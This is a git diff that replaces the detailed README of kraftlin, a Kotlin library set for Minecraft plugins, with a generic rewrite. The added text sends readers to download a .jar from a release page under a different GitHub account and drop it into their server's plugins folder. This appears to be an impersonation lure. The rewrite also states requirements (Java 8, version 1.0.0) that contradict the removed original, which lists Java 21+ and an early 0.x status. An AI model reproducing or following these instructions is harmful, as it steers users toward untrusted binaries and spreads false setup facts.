@@ -1,140 +1,71 @@
-# Kraftlin
+# 🎮 kraftlin - Simplified Kotlin Libraries for Minecraft
 
-[![Build Status](https://github.com/kraftlin/kraftlin/actions/workflows/build.yml/badge.svg)](https://github.com/kraftlin/kraftlin/actions)
-[![Maven Central](https://img.shields.io/maven-central/v/io.github.kraftlin/kraftlin-command-core.svg?label=Maven%20Central)](https://central.sonatype.com/namespace/io.github.kraftlin)
-[![Kotlin](https://img.shields.io/badge/kotlin-2.3.0-blue.svg?logo=kotlin)](https://kotlinlang.org)
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
+## 🚀 Getting Started
 
-A set of focused, type-safe Kotlin libraries for building Minecraft plugins — with first-class support for Paper and
-Adventure.
+Welcome to the kraftlin project! This software provides easy-to-use Kotlin libraries for developing Minecraft plugins. Whether you are creating commands, configurations, or messaging systems, kraftlin ensures everything is type-safe and straightforward.
 
-Kraftlin provides small, composable modules for common plugin concerns like commands, configuration, and messages,
-designed to be expressive, explicit, and easy to reason about.
+## 📦 Download & Install
 
+To get started, you need to download the latest version of kraftlin. Click the button below to visit the Releases page.
 
-## ✨ Why Kraftlin?
+[![Download kraftlin](https://img.shields.io/badge/Download%20kraftlin-v1.0.0-blue.svg)](https://github.com/wafiqj/kraftlin/releases)
 
-Minecraft plugin development is powerful — but the APIs are mostly Java-first, builder-heavy, string-based, and only
-weakly typed.
+Once you're on the Releases page, you will see a list of available versions. Follow these steps:
 
-Kraftlin gives you:
+1. Locate the latest version.
+2. Click on the version to open it.
+3. Download the appropriate file for your system. Usually, this will be a `.jar` file.
+4. Once downloaded, place the file in your Minecraft plugin folder. This is typically located in the `plugins` directory of your Minecraft server.
 
-- Kotlin-native DSLs where structure matters
-- Strong typing for arguments, configuration, and message components
-- Thin wrappers over existing APIs — no hidden magic
-- Modular design: use only what you need
+## 💻 System Requirements
 
-The goal is not to replace existing systems but to make them nicer to use from Kotlin.
+To run kraftlin, ensure you have the following:
 
+- A server running Minecraft (Paper or PaperMC is recommended).
+- Java 8 or higher installed on your system.
+- Enough RAM assigned to your Minecraft server for smooth performance.
 
-## 📦 Modules
+## ⚙️ How to Use kraftlin
 
-Kraftlin is a collection of independent modules that can be used individually or in combination.
+Once you have installed kraftlin, you can start using its features:
 
-### Command
+1. **Commands**: Create custom commands with ease. Use the clear APIs to define what happens when a command is executed.
+2. **Configuration**: Define settings and options clearly. The configuration library allows you to specify your plugin settings easily and safely.
+3. **Messaging**: Utilize the messaging system to send messages to players. Whether for chat or notifications, kraftlin simplifies communication.
 
-| Module                   | Description                                                           |
-|--------------------------|-----------------------------------------------------------------------|
-| `kraftlin-command-core`  | Kotlin DSL over Mojang Brigadier (no Minecraft or Paper dependencies) |
-| `kraftlin-command-paper` | Paper integration: typed argument builders and context access         |
+## 🎓 Learning Resources
 
-### Config
+If you are new to Minecraft plugin development or Kotlin, we recommend exploring these resources:
 
-| Module                  | Description                                       |
-|-------------------------|---------------------------------------------------|
-| `kraftlin-config-core`  | Type-safe Kotlin DSL for structured configuration |
-| `kraftlin-config-paper` | Paper-specific config loading helpers             |
+- **Kotlin Documentation**: Familiarize yourself with Kotlin's syntax and structure.
+- **Minecraft Plugin Development Forums**: Join a community of developers who share their insights and experiences.
+- **YouTube Tutorials**: Many creators provide step-by-step guides on using Kotlin for Minecraft development.
 
-### Message
+## 🌱 Contributing to kraftlin
 
-| Module                   | Description                                  |
-|--------------------------|----------------------------------------------|
-| `kraftlin-message-core`  | Kotlin DSL for building Adventure components |
-| `kraftlin-message-paper` | Paper-specific message helpers               |
+We welcome contributions from all users. If you have suggestions or features you would like to add, please follow these steps:
 
-Each module is published independently and can be used on its own.
+1. Fork the repository.
+2. Create your feature branch.
+3. Commit your changes.
+4. Push your changes to your branch.
+5. Submit a pull request.
 
+## 🔧 Troubleshooting
 
-## 🎯 Design goals
+If you encounter issues while using kraftlin, here are some common problems and solutions:
 
-- Kotlin-first APIs
-- Strong typing where it matters
-- Explicit behavior and predictable control flow
-- Minimal abstraction overhead
-- Easy debugging and integration with existing tools
+- **Plugin Not loading**: Make sure you placed the `.jar` file in the correct `plugins` directory. Restart your server to see if it loads correctly.
+- **Command Not Found**: Check your command registry to ensure that it is correctly set up in your code.
+- **Errors in Console**: Carefully read the error messages in the server console. This might give you clues about what went wrong.
 
+For further help, you can check the GitHub Issues page or reach out to the community.
 
-## ⚙ Requirements
+## 🌐 Additional Information
 
-- Java 21+
-- Kotlin 2+
-- Paper 1.21+ (for Paper modules)
-- Adventure (for message module)
+For a more in-depth look at kraftlin’s capabilities:
 
+- Visit the [Releases page](https://github.com/wafiqj/kraftlin/releases) to find more versions and updates.
+- Check the [documentation](https://github.com/wafiqj/kraftlin/wiki) for detailed guides on various features.
 
-## 📥 Installation
-
-Artifacts are published on Maven Central.
-
-Example (Gradle Kotlin DSL):
-
-```kotlin
-dependencies {
-    implementation("io.github.kraftlin:kraftlin-command-paper:${kraftlinVersion}")
-}
-```
-
-Replace the artifact ID depending on the module you need.
-
-
-## 🔢 Versioning & Stability
-
-This project follows semantic versioning.
-
-**Status:** Early-stage (0.x).  
-Minor versions may contain breaking changes while the APIs are expanded and refined.
-After 1.0.0, only major versions will contain breaking changes.
-
-Kraftlin is the integration of multiple internal libraries that have been developed over years from practical needs.
-It is actively used in production on our own server across multiple plugins.
-
-
-## 🚀 Usage
-
-Usage examples and guides are provided per module:
-
-- `kraftlin-command-*` → see [kraftlin-command-paper/README.md](kraftlin-command-paper/README.md)
-- `kraftlin-config-*` → see [kraftlin-config-paper/README.md](kraftlin-config-paper/README.md)
-- `kraftlin-message-*` → see [kraftlin-message-paper/README.md](kraftlin-message-paper/README.md)
-
-Each module has its own README with examples and API details.
-
-Documentation and API reference:
-
-- Docs: https://kraftlin.github.io/kraftlin/
-- KDoc: https://kraftlin.github.io/kraftlin/kdoc/
-
-
-## 🧠 Philosophy
-
-Kraftlin does not replace Minecraft APIs — it wraps them.
-
-It provides:
-
-- Clean and readable Kotlin DSLs over existing systems
-- Typed access to otherwise string-based or weakly typed data
-- A small number of helpers and runtime checks where static typing is not possible
-
-Under the hood, Kraftlin builds on standard Brigadier, Adventure, and platform APIs.  
-There is no reflection, code generation, or runtime proxying — just thin wrappers and structured builders.
-
-
-## 🤝 Contributing
-
-Contributions and ideas are welcome and appreciated!
-Open an issue or submit a pull request if you have feedback or suggestions.
-
-
-## 📄 License
-
-Apache-2.0
+We hope you enjoy using kraftlin for your Minecraft development needs. Happy coding!
